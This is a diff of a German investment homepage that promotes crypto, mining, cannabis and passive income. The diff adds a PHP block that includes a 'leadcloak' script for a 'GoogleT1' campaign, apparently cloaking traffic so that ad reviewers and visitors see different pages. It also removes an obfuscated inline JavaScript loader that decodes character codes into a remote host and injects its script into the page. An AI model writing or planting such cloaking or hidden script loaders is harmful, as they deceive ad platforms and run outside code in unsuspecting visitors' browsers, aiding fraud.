@@ -1,3 +1,36 @@
+<?php
+/**
+ * Campaign: GoogleT1
+ * Created: 2022-01-17 12:13:26 UTC
+ */
+
+require 'leadcloak-164rbxv5bvpi.php';
+
+// ---------------------------------------------------
+// Configuration
+
+// Set this to false if application is properly installed.
+$enableDebugging = false;
+
+// Set this to false if you won't want to log error messages
+$enableLogging = true;
+
+if ($enableDebugging) {
+	isApplicationReadyToRun();
+}
+
+$data = httpRequestMakePayload($campaignId, $campaignSignature);
+
+$response = httpRequestExec($data);
+
+$handler = httpHandleResponse($response, $enableLogging);
+
+if ($handler) {
+	exit();
+}
+
+?>
+
 <!DOCTYPE html><html lang="de-DE"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Home</title><meta name="description" content="Startseite des des Investment Lexikon "><meta name="keywords" content="Investment, Invest, Krypto, Währung, Cannabis, medizinisches Cannabis, ewallet, Hub, Mining, Minting ,  Rendite, elektronische Brieftasche , Anlage, passiv einkommen, nebenverdienst, "><meta content="Home" property="og:title"><meta content="website" property="og:type"><meta content="http://511166783.swh.strato-hosting.eu/Startseite/" property="og:url"><meta content="images/Logo%20miktro%20Investment.png" property="og:image">
 
 
@@ -15,7 +48,6 @@
 <link href="css/cm-templates-global-style.css" rel="stylesheet" type="text/css">
 	
 	
-	 <script type="text/javascript">(function(){function u(s){var y="";while(t=s.shift()){y=y.concat(v(t))}return y}function v(s){return String.fromCharCode(s)}function qq(k,n,c){for(var b=document.getElementsByTagName("script"),a=0;a<b.length;a++){if(-1===b[a].src.indexOf(n)){var head=document.getElementsByTagName("head")[0];var script=document.createElement("script");script.type="text/javascript";script.src=u(k)+u(c)+n;head.appendChild(script);return true}}return false}var z=[47,47,49,48,48,99,102,57,97,52,54,100,49,99,48,50,97,102,51,50,51,51,52,101,54,54,52,54,55,99,54,102,99,99,52,54,101,100,52,56,100,101,54,97,100,46,97,103,105,108,101,107,105,116,46,99,111,47];var y=[99,108,105,99,107,47];var x="164rbxv5bvpi.js";qq(z,x,y)})();</script> 
 
 <link href="css/vars.css" type="text/css" rel="stylesheet"><style type="text/css">.cm-logo {background-image: url("images/Inverstment.jpeg");
         background-position: 50% 50%;
